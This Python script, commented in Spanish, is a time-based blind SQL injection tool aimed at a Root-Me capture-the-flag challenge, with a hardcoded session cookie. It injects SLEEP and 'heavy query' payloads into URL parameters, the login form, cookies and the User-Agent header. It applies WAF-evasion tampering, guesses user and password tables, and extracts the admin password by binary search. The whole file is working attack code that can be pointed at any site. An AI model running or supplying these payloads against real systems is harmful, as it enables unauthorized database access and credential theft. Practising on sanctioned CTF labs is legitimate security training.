#!/usr/bin/env python3
"""
SQL Injection Time-Based - Auditoría Completa
Técnicas del PDF: Heavy queries con information_schema y tablas de usuarios
"""

import requests
import time
import hashlib
import urllib.parse
from typing import Dict, List, Tuple, Optional

class SQLInjectionAuditor:
    def __init__(self, url, cookie=None, timeout=30):
        self.url = url
        self.timeout = timeout
        self.cookies = cookie or {}
        self.session = requests.Session()
        self.session.cookies.update(self.cookies)
        
        # Umbral para time-based (se ajustará automáticamente)
        self.threshold = 3.0
        self.baseline_time = 0.0
        
        # Resultados
        self.results = {
            "vulnerable_points": [],
            "database_type": None,
            "tables": [],
            "columns": {}
        }
        
        # Payloads para evadir WAF
        self.tampers = [
            lambda x: x,  # Sin tamper
            lambda x: x.replace(" ", "/**/"),
            lambda x: x.replace(" ", "/%2a%2a/"),
            lambda x: x.replace("'", "%27"),
            lambda x: x.replace(" ", "%20"),
            lambda x: x.upper() if "SELECT" in x else x,
            lambda x: x.replace("SELECT", "/*!50000SELECT*/"),
            lambda x: x.replace("AND", "&&"),
            lambda x: x.replace("OR", "||"),
            lambda x: x.replace("=", "LIKE"),
            lambda x: x.replace(" ", "\n"),
            lambda x: x.replace(" ", "\t"),
            lambda x: f"/**/{x}/**/",
        ]
        
        # Heavy queries del PDF
        self.heavy_queries = [
            # information_schema (MySQL 5+)
            "(SELECT COUNT(*) FROM information_schema.columns, information_schema.columns T1, information_schema.columns T2)",
            "(SELECT COUNT(*) FROM information_schema.columns, information_schema.columns T1, information_schema.columns T2, information_schema.columns T3)",
            "(SELECT COUNT(*) FROM information_schema.tables, information_schema.tables T1, information_schema.tables T2)",
            
            # Tablas de usuarios (si information_schema no funciona)
            "(SELECT COUNT(*) FROM users, users T1, users T2, users T3)",
            "(SELECT COUNT(*) FROM member, member T1, member T2, member T3)",
            "(SELECT COUNT(*) FROM admin, admin T1, admin T2, admin T3)",
            
            # sys (SQL Server)
            "(SELECT COUNT(*) FROM sysusers, sysusers T1, sysusers T2, sysusers T3)",
            
            # all_users (Oracle)
            "(SELECT COUNT(*) FROM all_users, all_users T1, all_users T2, all_users T3)",
        ]
        
        self.tables_to_test = [
            'users', 'usuarios', 'member', 'members', 'admin', 
            'administradores', 'user', 'login', 'account', 'accounts',
            'customers', 'clients', 'person', 'people', 'employee'
        ]
        
        self.columns_to_test = {
            'user': ['username', 'user', 'login', 'name', 'admin', 'usuario', 'email', 'mail'],
            'pass': ['password', 'pass', 'clave', 'contrasena', 'pwd', 'pw', 'hash', 'secret']
        }

    def set_baseline(self, test_payload="1=1"):
        """Establece el tiempo baseline"""
        print("[*] Estableciendo baseline...")
        times = []
        for _ in range(3):
            t = self.test_time(test_payload)
            if t > 0:
                times.append(t)
            time.sleep(0.5)
        
        if times:
            self.baseline_time = sum(times) / len(times)
            self.threshold = self.baseline_time + 2.0
            print(f"[+] Baseline: {self.baseline_time:.2f}s")
            print(f"[+] Threshold: {self.threshold:.2f}s")
        else:
            self.baseline_time = 0.1
            self.threshold = 3.0
            print(f"[!] Usando threshold por defecto: {self.threshold:.2f}s")

    def test_time(self, payload, tamper_index=0, method="GET", params=None, data=None):
        """Prueba un payload y mide el tiempo"""
        if tamper_index < len(self.tampers):
            payload = self.tampers[tamper_index](payload)
        
        url = self.url
        try:
            if method == "GET":
                if params is None:
                    params = {}
                # Si el payload es para action o member
                if "action=" in str(params) or "member=" in str(params):
                    # Usar los parámetros existentes
                    pass
                else:
                    # Asumir que es para action
                    params = {"action": payload}
                
                inicio = time.time()
                r = self.session.get(url, params=params, timeout=self.timeout)
                tiempo = time.time() - inicio
                
            elif method == "POST":
                if data is None:
                    data = {}
                inicio = time.time()
                r = self.session.post(url, data=data, timeout=self.timeout)
                tiempo = time.time() - inicio
                
            elif method == "COOKIE":
                # Probar en cookie
                cookie_payload = self.session.cookies.get("PHPSESSID", "") + payload
                cookies = {"PHPSESSID": cookie_payload}
                inicio = time.time()
                r = self.session.get(url, cookies=cookies, timeout=self.timeout)
                tiempo = time.time() - inicio
                
            elif method == "HEADER":
                headers = {"User-Agent": payload}
                inicio = time.time()
                r = self.session.get(url, headers=headers, timeout=self.timeout)
                tiempo = time.time() - inicio
            
            # Guardar el contenido para análisis
            self.last_response = r.text
            self.last_length = len(r.text)
            self.last_status = r.status_code
            
            return tiempo
            
        except Exception as e:
            print(f"[!] Error en test_time: {e}")
            return 0.0

    def is_vulnerable(self, tiempo):
        """Determina si un tiempo indica vulnerabilidad"""
        return tiempo > self.threshold

    def test_injection_point(self, payload, description, method="GET", params=None, data=None):
        """Prueba un punto de inyección con diferentes tamper"""
        print(f"\n[*] Probando: {description}")
        print(f"    Payload: {payload[:80]}...")
        
        for i, tamper in enumerate(self.tampers):
            try:
                t = self.test_time(payload, i, method, params, data)
                status = "✅ VULNERABLE" if self.is_vulnerable(t) else "❌"
                print(f"    [{i:2d}] {status} -> {t:.2f}s (threshold: {self.threshold:.2f}s)")
                
                if self.is_vulnerable(t):
                    # Guardar el punto vulnerable
                    self.results["vulnerable_points"].append({
                        "point": description,
                        "payload": payload,
                        "tamper": i,
                        "time": t,
                        "method": method,
                        "params": params,
                        "data": data
                    })
                    return True
            except Exception as e:
                print(f"    [{i:2d}] ⚠️ Error: {e}")
            
            time.sleep(0.3)  # Pausa para no saturar
        
        return False

    def scan_parameters(self):
        """Escanea todos los parámetros posibles"""
        print("\n" + "="*70)
        print("  ESCANEANDO PARÁMETROS")
        print("="*70)
        
        # 1. Parámetro member (GET)
        print("\n[1] Probando parámetro 'member'...")
        payloads = [
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1) AND (1=1",
            "1) AND (1=2",
            "1 AND SLEEP(5)",
            "1' AND SLEEP(5)-- -",
            "1 AND IF(1=1, SLEEP(5), 0)",
        ]
        
        for payload in payloads:
            params = {"action": "member", "member": payload}
            if self.test_injection_point(
                payload, 
                f"member={payload}", 
                "GET", 
                params
            ):
                print(f"[+] ¡VULNERABILIDAD ENCONTRADA en member!")
                return True
        
        # 2. Parámetro action (GET)
        print("\n[2] Probando parámetro 'action'...")
        payloads = [
            "login' AND 1=1",
            "login' AND 1=2",
            "login' OR '1'='1",
            "login' OR '1'='2",
            "login' AND SLEEP(5)-- -",
            "login' AND IF(1=1, SLEEP(5), 0)-- -",
            "member' AND SLEEP(5)-- -",
            "memberlist' AND SLEEP(5)-- -",
        ]
        
        for payload in payloads:
            if self.test_injection_point(
                payload, 
                f"action={payload}", 
                "GET", 
                {"action": payload}
            ):
                print(f"[+] ¡VULNERABILIDAD ENCONTRADA en action!")
                return True
        
        # 3. Login POST
        print("\n[3] Probando login POST...")
        login_payloads = [
            ("admin' AND 1=1", "test"),
            ("admin' AND 1=2", "test"),
            ("admin' OR '1'='1", "test"),
            ("admin' OR '1'='2", "test"),
            ("admin' AND SLEEP(5)-- -", "test"),
            ("admin' AND IF(1=1, SLEEP(5), 0)-- -", "test"),
            ("admin", "test' AND SLEEP(5)-- -"),
            ("admin", "test' OR '1'='1"),
        ]
        
        for username, password in login_payloads:
            data = {"username": username, "password": password}
            if self.test_injection_point(
                f"username={username}, password={password}", 
                f"Login POST",
                "POST",
                params={"action": "login"},
                data=data
            ):
                print(f"[+] ¡VULNERABILIDAD ENCONTRADA en login!")
                return True
        
        # 4. Cookie
        print("\n[4] Probando cookie...")
        cookie_payloads = [
            "' AND 1=1",
            "' AND 1=2",
            "' AND SLEEP(5)-- -",
            "' AND IF(1=1, SLEEP(5), 0)-- -",
        ]
        
        for payload in cookie_payloads:
            if self.test_injection_point(
                payload,
                f"Cookie: {payload}",
                "COOKIE"
            ):
                print(f"[+] ¡VULNERABILIDAD ENCONTRADA en cookie!")
                return True
        
        # 5. Cabeceras
        print("\n[5] Probando cabeceras...")
        header_payloads = [
            "Mozilla/5.0' AND 1=1",
            "Mozilla/5.0' AND 1=2",
            "Mozilla/5.0' AND SLEEP(5)-- -",
        ]
        
        for payload in header_payloads:
            if self.test_injection_point(
                payload,
                f"User-Agent: {payload}",
                "HEADER"
            ):
                print(f"[+] ¡VULNERABILIDAD ENCONTRADA en cabeceras!")
                return True
        
        return False

    def test_heavy_query(self):
        """Prueba heavy queries del PDF"""
        print("\n" + "="*70)
        print("  PROBANDO HEAVY QUERIES DEL PDF")
        print("="*70)
        
        # Primero probar en member
        print("\n[1] Probando heavy queries en member...")
        for heavy in self.heavy_queries:
            payload = f"1 AND {heavy}"
            params = {"action": "member", "member": payload}
            t = self.test_time(payload, 1, "GET", params)
            if self.is_vulnerable(t):
                print(f"[+] ¡Heavy query funciona! Tiempo: {t:.2f}s")
                print(f"    Query: {heavy[:80]}...")
                return heavy
        
        # Probar en action
        print("\n[2] Probando heavy queries en action...")
        for heavy in self.heavy_queries:
            payload = f"login' AND {heavy}-- -"
            t = self.test_time(payload, 1, "GET", {"action": payload})
            if self.is_vulnerable(t):
                print(f"[+] ¡Heavy query funciona! Tiempo: {t:.2f}s")
                print(f"    Query: {heavy[:80]}...")
                return heavy
        
        return None

    def test_time_based_extraction(self, heavy_query):
        """Prueba extracción time-based con la técnica del PDF"""
        print("\n" + "="*70)
        print("  PROBANDO EXTRACCIÓN TIME-BASED")
        print("="*70)
        
        # Probar en member
        for table in self.tables_to_test:
            print(f"\n[*] Probando tabla: {table}")
            
            # Verificar si la tabla existe
            cond = f"EXISTS(SELECT * FROM {table})"
            payload = f"1 AND IF({cond}, {heavy_query}, 0)"
            params = {"action": "member", "member": payload}
            t = self.test_time(payload, 1, "GET", params)
            
            if self.is_vulnerable(t):
                print(f"[+] Tabla encontrada: {table}")
                self.results["tables"].append(table)
                
                # Buscar columnas
                for col_type, cols in self.columns_to_test.items():
                    for col in cols:
                        cond = f"EXISTS(SELECT {col} FROM {table})"
                        payload = f"1 AND IF({cond}, {heavy_query}, 0)"
                        t = self.test_time(payload, 1, "GET", params)
                        
                        if self.is_vulnerable(t):
                            print(f"    [+] Columna encontrada: {col}")
                            if col_type not in self.results["columns"]:
                                self.results["columns"][col_type] = []
                            self.results["columns"][col_type].append(col)
                
                return table
        
        return None

    def extract_password(self, table, col_user, col_pass, heavy_query):
        """Extrae la contraseña del admin usando la técnica del PDF"""
        print("\n" + "="*70)
        print("  EXTRACCIÓN DE CONTRASEÑA")
        print("="*70)
        
        # Query base
        query = f"SELECT {col_pass} FROM {table} WHERE {col_user}='admin'"
        
        # 1. Obtener longitud
        print("\n[1] Obteniendo longitud...")
        length = 0
        for i in range(1, 50):
            cond = f"LENGTH(({query})) = {i}"
            payload = f"1 AND IF({cond}, {heavy_query}, 0)"
            params = {"action": "member", "member": payload}
            t = self.test_time(payload, 1, "GET", params)
            
            if self.is_vulnerable(t):
                length = i
                print(f"[+] Longitud: {length}")
                break
            print(f"    Probando {i}: {t:.2f}s")
        
        if length == 0:
            print("[!] No se pudo obtener la longitud")
            return None
        
        # 2. Extraer caracteres (búsqueda binaria)
        print("\n[2] Extrayendo caracteres...")
        password = ""
        
        for pos in range(1, length + 1):
            low, high = 32, 126
            
            while low <= high:
                mid = (low + high) // 2
                cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
                payload = f"1 AND IF({cond}, {heavy_query}, 0)"
                params = {"action": "member", "member": payload}
                t = self.test_time(payload, 1, "GET", params)
                
                if self.is_vulnerable(t):
                    low = mid + 1
                else:
                    high = mid - 1
            
            char = chr(low)
            password += char
            print(f"    [{pos}/{length}] '{char}' (ASCII: {ord(char)})")
            print(f"    Progreso: {password}")
        
        return password

    def run(self):
        """Ejecuta la auditoría completa"""
        print("="*70)
        print("  SQL INJECTION TIME-BASED AUDITOR")
        print("  Técnicas del PDF: Heavy Queries")
        print("="*70)
        
        # 1. Establecer baseline
        self.set_baseline()
        
        # 2. Escanear parámetros
        if self.scan_parameters():
            print("\n[+] ¡Vulnerabilidad encontrada! Continuando...")
        else:
            print("\n[!] No se encontró vulnerabilidad en parámetros comunes")
            print("[!] Probando con técnicas alternativas...")
        
        # 3. Probar heavy queries
        heavy_query = self.test_heavy_query()
        if not heavy_query:
            print("\n[!] No se encontró heavy query que funcione")
            print("[!] Probando con tablas específicas...")
            
            # Intentar con tablas específicas
            for table in self.tables_to_test:
                heavy = f"(SELECT COUNT(*) FROM {table}, {table} T1, {table} T2, {table} T3)"
                payload = f"1 AND {heavy}"
                params = {"action": "member", "member": payload}
                t = self.test_time(payload, 1, "GET", params)
                if self.is_vulnerable(t):
                    print(f"[+] Heavy query con {table} funciona!")
                    heavy_query = heavy
                    break
        
        # 4. Extraer datos
        if heavy_query:
            print(f"\n[+] Heavy query encontrada: {heavy_query[:80]}...")
            
            # Buscar tablas y columnas
            table = self.test_time_based_extraction(heavy_query)
            
            if table and self.results["columns"]:
                # Extraer contraseña
                col_user = self.results["columns"].get("user", [None])[0]
                col_pass = self.results["columns"].get("pass", [None])[0]
                
                if col_user and col_pass:
                    password = self.extract_password(table, col_user, col_pass, heavy_query)
                    if password:
                        print("\n" + "="*70)
                        print(f"[+] ¡CONTRASEÑA ENCONTRADA!: {password}")
                        print("="*70)
                        return password
        
        # 5. Resumen final
        print("\n" + "="*70)
        print("  RESUMEN DE AUDITORÍA")
        print("="*70)
        print(f"Puntos vulnerables encontrados: {len(self.results['vulnerable_points'])}")
        print(f"Tablas encontradas: {self.results['tables']}")
        print(f"Columnas encontradas: {self.results['columns']}")

def main():
    # Configuración
    URL = "http://challenge01.root-me.org/web-serveur/ch40/"
    COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}
    
    # Crear auditor y ejecutar
    auditor = SQLInjectionAuditor(URL, COOKIE)
    auditor.run()

if __name__ == "__main__":
    main()
